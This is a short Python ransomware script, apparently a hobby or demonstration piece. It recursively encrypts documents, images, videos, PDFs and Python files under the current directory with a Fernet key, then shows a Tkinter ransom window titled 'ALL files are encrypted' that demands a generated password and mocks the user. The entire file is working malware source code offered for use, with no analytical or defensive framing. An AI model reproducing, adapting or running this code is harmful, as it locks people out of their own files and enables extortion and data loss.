#coded by cybereagle2001

from tkinter import *
import os
from cryptography.fernet import Fernet
import string
import random

def decrypt(password,key):
    def button_command(password,key):
        key1=entry1.get()
        i=0
        if (key1 == password):
            for loop in victim_file:
                with open(loop,"rb") as file:
                    content= file.read()
                content_dec= Fernet(key).decrypt(content)
                with open(loop,"wb") as file:
                    file.write(content_dec)
            print("good boy you did well!!")
            quit()
        else:
             print("you are hacked!! don't play dump")

    root = Tk()
    root.title("ALL files are encrypted")
    root.geometry('400x200')
    entry1= Entry(root,width=200)
    entry1.pack()
    Button(root,text="decrypt",command=lambda:button_command(password,key)).pack()
    root.mainloop()

def password_gen(N=50):
	return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
	
def encrypt(victim_file):
    key= Fernet.generate_key()
    for loop in victim_file:
        with open(loop,"rb") as file:
            content= file.read()
        content_enc= Fernet(key).encrypt(content)
        with open(loop,"wb") as file:
            file.write(content_enc)
    password=password_gen()
    print(password)
    decrypt(password,key)

encrypted_ext=(".mp4",".py",".txt",".docx",".odt",".xlsx",".gif",".png",".jpeg",".pdf")

victim_file=[]
for root,dirs,files in os.walk('.'):
    for file in files:
        if (file =="cyber_ran.py"):
            continue
        else:
            file_path,file_ext= os.path.splitext(root+'/'+file)
            if file_ext in encrypted_ext:
                victim_file.append(root+'/'+file)
encrypt(victim_file)
